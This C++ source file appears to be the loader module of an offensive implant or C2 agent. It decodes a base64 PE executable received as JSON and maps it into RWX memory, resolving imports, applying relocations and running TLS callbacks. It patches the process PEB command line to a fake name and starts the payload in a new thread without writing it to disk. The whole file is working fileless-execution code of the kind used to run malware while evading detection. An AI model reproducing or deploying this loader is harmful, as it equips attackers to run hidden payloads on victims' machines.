#define _CRT_SECURE_NO_WARNINGS
#include "base64.h"
#include <windows.h>
#include <string>
#include <vector>
#include <stdexcept>
#include <sstream>
#include <algorithm>
#include <winternl.h>
#include <iostream>

// Helper: output debug to debugger
void debug_msg(std::ostringstream& log, const std::string& msg) {
    log << msg << std::endl;
    OutputDebugStringA((msg + "\n").c_str());
}

bool apply_relocations(PBYTE base, ULONGLONG delta, IMAGE_NT_HEADERS64* nt_headers, std::ostringstream& log) {
    if (delta == 0) {
        debug_msg(log, "[reloc] No relocation needed");
        return true;
    }
    auto& dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!dir.VirtualAddress || !dir.Size) {
        debug_msg(log, "[reloc] No base relocation directory");
        return true;
    }
    DWORD offset = 0;
    while (offset < dir.Size) {
        auto block = (IMAGE_BASE_RELOCATION*)(base + dir.VirtualAddress + offset);
        size_t count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* relocdata = (WORD*)(block + 1);
        std::ostringstream blk;
        blk << "[reloc] Block at RVA 0x" << std::hex << block->VirtualAddress << ", " << std::dec << count << " entries";
        debug_msg(log, blk.str());
        for (size_t i = 0; i < count; i++) {
            WORD type = relocdata[i] >> 12;
            WORD rvaOffset = relocdata[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG* patch = (ULONGLONG*)(base + block->VirtualAddress + rvaOffset);
                ULONGLONG before = *patch;
                *patch += delta;
                std::ostringstream pat;
                pat << "   - reloc @ 0x" << std::hex << (block->VirtualAddress + rvaOffset)
                    << " patched: " << std::hex << before << " -> " << *patch;
                debug_msg(log, pat.str());
            }
        }
        offset += block->SizeOfBlock;
    }
    return true;
}

void run_tls_callbacks(PBYTE imageBase, IMAGE_NT_HEADERS64* nt_headers, std::ostringstream& log) {
    auto& tlsdir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!tlsdir.VirtualAddress) {
        debug_msg(log, "[tls] No TLS callbacks section");
        return;
    }
    IMAGE_TLS_DIRECTORY64* tls = (IMAGE_TLS_DIRECTORY64*)(imageBase + tlsdir.VirtualAddress);
    if (!tls->AddressOfCallBacks) {
        debug_msg(log, "[tls] TLS directory present, but no callbacks");
        return;
    }
    debug_msg(log, "[tls] Calling TLS callbacks...");
    ULONGLONG* callbacks = (ULONGLONG*)tls->AddressOfCallBacks;
    int idx = 0;
    while (*callbacks) {
        std::ostringstream msg;
        msg << "   - TLS callback #" << idx++;
        debug_msg(log, msg.str());
        auto cb = (PIMAGE_TLS_CALLBACK)*callbacks;
        cb((PVOID)imageBase, DLL_PROCESS_ATTACH, nullptr); // convention reflective-inject
        callbacks++;
    }
}

bool fix_imports(PBYTE img, IMAGE_NT_HEADERS64* nt_headers, std::ostringstream& log) {
    auto& impdir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!impdir.VirtualAddress) {
        debug_msg(log, "[imp] No import directory");
        return true;
    }
    IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)(img + impdir.VirtualAddress);
    while (imp->Name) {
        char* mod = (char*)(img + imp->Name);
        std::ostringstream msg;
        msg << "[imp] Resolving " << mod;
        debug_msg(log, msg.str());
        HMODULE hModule = LoadLibraryA(mod);
        if (!hModule) {
            debug_msg(log, "[imp]   Error: could not LoadLibraryA");
            return false;
        }
        IMAGE_THUNK_DATA64* orig = (IMAGE_THUNK_DATA64*)(img + imp->OriginalFirstThunk);
        IMAGE_THUNK_DATA64* thunk = (IMAGE_THUNK_DATA64*)(img + imp->FirstThunk);
        for (; orig->u1.AddressOfData; orig++, thunk++) {
            LPVOID fn = nullptr;
            if (orig->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
                fn = (LPVOID)GetProcAddress(hModule, (LPCSTR)(orig->u1.Ordinal & 0xFFFF));
            else {
                IMAGE_IMPORT_BY_NAME* byname = (IMAGE_IMPORT_BY_NAME*)(img + orig->u1.AddressOfData);
                fn = (LPVOID)GetProcAddress(hModule, (LPCSTR)byname->Name);
                std::ostringstream fnmsg;
                fnmsg << "      - " << byname->Name << " = " << (void*)fn;
                debug_msg(log, fnmsg.str());
            }
            if (!fn) {
                debug_msg(log, "[imp]   Error: could not GetProcAddress");
                return false;
            }
            thunk->u1.Function = (ULONGLONG)fn;
        }
        imp++;
    }
    return true;
}



struct PEB_CMDLINE_BACKUP {
    UNICODE_STRING unicode_backup;
    std::wstring   orig_cmdline;
};

// backup and restore the peb
void patch_command_line(const std::wstring& new_cmdline, struct PEB_CMDLINE_BACKUP& backup)
{
    #ifdef _WIN64
    PVOID peb = (PVOID)__readgsqword(0x60);
    #else
    PVOID peb = (PVOID)__readfsdword(0x30);
    #endif
    // LPEB->ProcessParameters
    PVOID procParams = *(PVOID*)((BYTE*)peb + 0x20);
    // Offset 0x70 = struct UNICODE_STRING (RTL_USER_PROCESS_PARAMETERS::CommandLine)
    UNICODE_STRING* cmdLine = (UNICODE_STRING*)((BYTE*)procParams + 0x70);

    // backup
    backup.unicode_backup = *cmdLine;
    if (cmdLine->Buffer)
        backup.orig_cmdline.assign(cmdLine->Buffer, cmdLine->Length / sizeof(wchar_t));

    // patch
    if (cmdLine->Buffer) {
        wcsncpy(cmdLine->Buffer, new_cmdline.c_str(), (cmdLine->MaximumLength / sizeof(wchar_t))-1);
        cmdLine->Buffer[(cmdLine->MaximumLength/sizeof(wchar_t))-1] = 0; // forcibly null-terminated
        cmdLine->Length = (USHORT)(wcslen(cmdLine->Buffer) * sizeof(wchar_t));
    }
}

void restore_command_line(const struct PEB_CMDLINE_BACKUP& backup)
{
    #ifdef _WIN64
    PVOID peb = (PVOID)__readgsqword(0x60);
    #else
    PVOID peb = (PVOID)__readfsdword(0x30);
    #endif
    PVOID procParams = *(PVOID*)((BYTE*)peb + 0x20);
    UNICODE_STRING* cmdLine = (UNICODE_STRING*)((BYTE*)procParams + 0x70);
    if (cmdLine->Buffer && !backup.orig_cmdline.empty()) {
        wcsncpy(cmdLine->Buffer, backup.orig_cmdline.c_str(), (cmdLine->MaximumLength / sizeof(wchar_t))-1);
        cmdLine->Buffer[(cmdLine->MaximumLength/sizeof(wchar_t))-1] = 0;
        cmdLine->Length = (USHORT)(wcslen(cmdLine->Buffer) * sizeof(wchar_t));
    }
    *cmdLine = backup.unicode_backup;
}

std::string get_encoded_PE_content(std::string data) {
    const std::string key = "'content':";
    size_t pos = data.find(key);
    pos += key.length();
    pos = data.find('\'', pos);
    pos++;
    size_t fin = data.find('\'', pos);
    return data.substr(pos, fin - pos);
}

std::string get_encoded_PE_args(std::string data) {
    const std::string key = "'args':";
    size_t pos = data.find(key);
    pos += key.length();
    pos = data.find('\'', pos);
    pos++;
    size_t fin = data.find('\'', pos);
    return data.substr(pos, fin - pos);
}

std::wstring to_wstring(const std::string& str) {
    int sz = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring w(sz, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &w[0], sz);
    w.resize(wcscmp(w.c_str(), L"") == 0 ? 0 : sz - 1);
    return w;
}


std::string exec_pe_in_mem(const std::string& pe_json) {
    std::ostringstream log;
    
    #ifdef _DEBUG
    std::cout << "[LOADER] Starting exec_pe_in_mem..." << std::endl;
    std::cout << "[LOADER] JSON length: " << pe_json.length() << std::endl;
    #endif
    
    debug_msg(log, "[loader] Parsing PE JSON data...");
    // pe_json est déjà du JSON clair: {'content':'base64_pe','args':'base64_args'}
    // Pas besoin de décoder en base64, c'est déjà déchiffré par fetch_pe_data()
    std::string file_props = pe_json;
    
    #ifdef _DEBUG
    std::cout << "[LOADER] Extracting content from JSON..." << std::endl;
    #endif
    
    std::string b64_encoded_filecontent = get_encoded_PE_content(file_props);
    
    #ifdef _DEBUG
    std::cout << "[LOADER] Content base64 length: " << b64_encoded_filecontent.length() << std::endl;
    #endif
    
    std::string b64_encoded_args = get_encoded_PE_args(file_props);
    
    #ifdef _DEBUG
    std::cout << "[LOADER] Args base64 length: " << b64_encoded_args.length() << std::endl;
    std::cout << "[LOADER] Decoding PE base64..." << std::endl;
    #endif

    debug_msg(log, "[loader] Decoding PE base64...");
    std::string peBin = base64_decode(b64_encoded_filecontent);
    
    #ifdef _DEBUG
    std::cout << "[LOADER] PE binary size: " << peBin.length() << " bytes" << std::endl;
    #endif
    
    std::string args = base64_decode(b64_encoded_args);
    debug_msg(log, "[loader] PE binary size: " + std::to_string(peBin.length()) + " bytes");

    #ifdef _DEBUG
    std::cout << "[LOADER] Preparing PEB patch..." << std::endl;
    #endif
    
    PEB_CMDLINE_BACKUP peb_bak = {};
    // the first arg is the PE_name
    args = "fake_PE_name " + args;
    std::wstring wargs = to_wstring(args);
    debug_msg(log, "[loader] Patching PEB to add args...");
    
    #ifdef _DEBUG
    std::cout << "[LOADER] Calling patch_command_line..." << std::endl;
    #endif
    
    patch_command_line(wargs, peb_bak);
    
    #ifdef _DEBUG
    std::cout << "[LOADER] PEB patched successfully" << std::endl;
    #endif

    const BYTE* pb = reinterpret_cast<const BYTE*>(peBin.data());
    
    #ifdef _DEBUG
    std::cout << "[LOADER] Checking DOS header..." << std::endl;
    #endif
    
    debug_msg(log, "[loader] Checking DOS header...");
    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(pb);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        #ifdef _DEBUG
        std::cout << "[LOADER] ERROR: Invalid DOS magic!" << std::endl;
        #endif
        debug_msg(log, "[err] Invalid PE: DOS magic");
        return log.str();
    }
    
    #ifdef _DEBUG
    std::cout << "[LOADER] DOS header OK, checking NT header..." << std::endl;
    #endif
    
    debug_msg(log, "[loader] Checking NT header...");
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS64 const *>(pb + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        #ifdef _DEBUG
        std::cout << "[LOADER] ERROR: Invalid NT signature!" << std::endl;
        #endif
        debug_msg(log, "[err] Invalid PE: NT Signature");
        return log.str();
    }

    #ifdef _DEBUG
    std::cout << "[LOADER] NT header OK" << std::endl;
    std::cout << "[LOADER] Machine: 0x" << std::hex << nt->FileHeader.Machine << std::dec << std::endl;
    std::cout << "[LOADER] SizeOfImage: " << nt->OptionalHeader.SizeOfImage << std::endl;
    #endif

    SIZE_T imgsize = nt->OptionalHeader.SizeOfImage;
    
    #ifdef _DEBUG
    std::cout << "[LOADER] Allocating " << imgsize << " bytes..." << std::endl;
    #endif
    
    debug_msg(log, "[loader] Allocating memory...");
    PBYTE imgmapped = (PBYTE)VirtualAlloc(nullptr, imgsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!imgmapped) {
        #ifdef _DEBUG
        std::cout << "[LOADER] ERROR: VirtualAlloc failed!" << std::endl;
        #endif
        debug_msg(log, "[err] VirtualAlloc failed");
        return log.str();
    }

    #ifdef _DEBUG
    std::cout << "[LOADER] Memory allocated at: 0x" << std::hex << (UINT_PTR)imgmapped << std::dec << std::endl;
    #endif

    // map headers
    SIZE_T hdrs = nt->OptionalHeader.SizeOfHeaders;
    
    #ifdef _DEBUG
    std::cout << "[LOADER] Copying " << hdrs << " bytes of headers..." << std::endl;
    #endif
    
    debug_msg(log, "[loader] Copying PE headers...");
    memcpy(imgmapped, pb, hdrs);

    #ifdef _DEBUG
    std::cout << "[LOADER] Mapping " << nt->FileHeader.NumberOfSections << " sections..." << std::endl;
    #endif

    // map sections
    IMAGE_SECTION_HEADER* sect = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sect++) {
        auto dptr = imgmapped + sect->VirtualAddress;
        auto rptr = pb + sect->PointerToRawData;
        std::ostringstream s;
        s << "[sect] Mapping: " << (char*)sect->Name << " VA: 0x" << std::hex << sect->VirtualAddress
          << " RAW: 0x" << sect->PointerToRawData << " Size: " << std::dec << sect->SizeOfRawData;
        debug_msg(log, s.str());
        
        #ifdef _DEBUG
        std::cout << "[LOADER] Section " << i << ": " << (char*)sect->Name << std::endl;
        #endif
        
        memcpy(dptr, rptr, sect->SizeOfRawData);
    }

    #ifdef _DEBUG
    std::cout << "[LOADER] Sections mapped, fixing imports..." << std::endl;
    #endif

    if (!fix_imports(imgmapped, (IMAGE_NT_HEADERS64*)nt, log))
    {
        VirtualFree(imgmapped, 0, MEM_RELEASE);
        debug_msg(log, "[err] fix_imports failed");
        restore_command_line(peb_bak); // RESTORE!
        return log.str();
    }

    // apply relocs
    ULONGLONG delta = (ULONGLONG)imgmapped - nt->OptionalHeader.ImageBase;
    std::ostringstream relocdelta;
    relocdelta << "[reloc] Image base delta: 0x" << std::hex << delta;
    debug_msg(log, relocdelta.str());
    if (!apply_relocations(imgmapped, delta, (IMAGE_NT_HEADERS64*)nt, log))
    {
        VirtualFree(imgmapped, 0, MEM_RELEASE);
        debug_msg(log, "[err] Relocations failed");
        restore_command_line(peb_bak); // RESTORE!
        return log.str();
    }

    // TLS callbacks
    run_tls_callbacks(imgmapped, (IMAGE_NT_HEADERS64*)nt, log);

    // Entry
    auto entryAddr = imgmapped + nt->OptionalHeader.AddressOfEntryPoint;
    std::ostringstream entryinfo;
    entryinfo << "[entry] EntryPoint: 0x" << std::hex << (UINT_PTR)entryAddr;
    debug_msg(log, entryinfo.str());

    DWORD tid;
    debug_msg(log, "[thread] Creating thread...");
    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)entryAddr, nullptr, 0, &tid);
    if (!hThread) {
        VirtualFree(imgmapped, 0, MEM_RELEASE);
        debug_msg(log, "[err] CreateThread failed");
        restore_command_line(peb_bak); // RESTORE!
        return log.str();
    }
    debug_msg(log, "[done] PE executed. Waiting for thread end...");

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    restore_command_line(peb_bak);

    debug_msg(log, "[done] PEB restored.");
    return log.str();
}
